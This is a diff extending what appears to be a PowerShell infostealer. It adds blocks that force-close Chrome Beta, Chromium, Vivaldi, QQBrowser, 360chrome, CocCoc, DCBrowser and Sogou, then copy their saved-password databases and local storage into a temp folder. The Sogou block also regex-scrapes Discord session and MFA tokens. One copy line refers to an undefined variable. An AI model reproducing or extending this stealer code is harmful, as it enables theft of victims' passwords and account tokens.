@@ -648,6 +648,92 @@ sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome" -Browser "Chrome"
 }
 
+# Get ChromeBeta Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Google\Chrome Beta\User Data\Local State")){
+taskkill /IM chromebeta.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome Beta" -Browser "ChromeBeta"
+}
+
+# Get Chromium Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Chromium\User Data\Local State")){
+taskkill /IM chromium.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\Chromium" -Browser "Chromium"
+}
+
+# Get 360chrome Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\360chrome\Chrome\User Data\Local State")){
+taskkill /IM 360chrome.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\360chrome\Chrome" -Browser "360Chrome"
+}
+
+# Get QQBrowser Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Tencent\QQBrowser\User Data\Local State")){
+taskkill /IM qqbrowser.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\Tencent\QQBrowser" -Browser "QQBrowser"
+}
+
+# Get Vivaldi Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Vivaldi\User Data\Local State")){
+taskkill /IM vivaldi.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\Vivaldi" -Browser "Vivaldi"
+}
+
+# Get CocCoc Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\CocCoc\Browser\User Data\Local State")){
+taskkill /IM coccoc.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\CocCoc\Browser" -Browser "CocCoc"
+}
+
+# Get DCBrowser Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\DCBrowser\User Data\Local State")){
+taskkill /IM dcbrowser.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\DCBrowser" -Browser "DCBrowser"
+}
+
+# Get SogouExplorer Passwords
+$path="$env:appdata\..\Local\SogouExplorer\Webkit"
+if([System.IO.File]::Exists("$path\Local State")){
+taskkill /IM sogou.exe /F
+sleep 1
+$Browser="Sogou"
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$logindata = "$path\Default\Login Data"
+$preferences = "$path\Default\Preferences"
+$leveldb = "$path\Default\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+$ldb = Get-ChildItem $lvdb\*.ldb
+foreach ($file in $ldb) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$log = Get-ChildItem $lvdb\*.log
+foreach ($file in $log) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+
+}
+
 # Get Edge Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Microsoft\Edge\User Data\Local State")){
 taskkill /IM msedge.exe /F
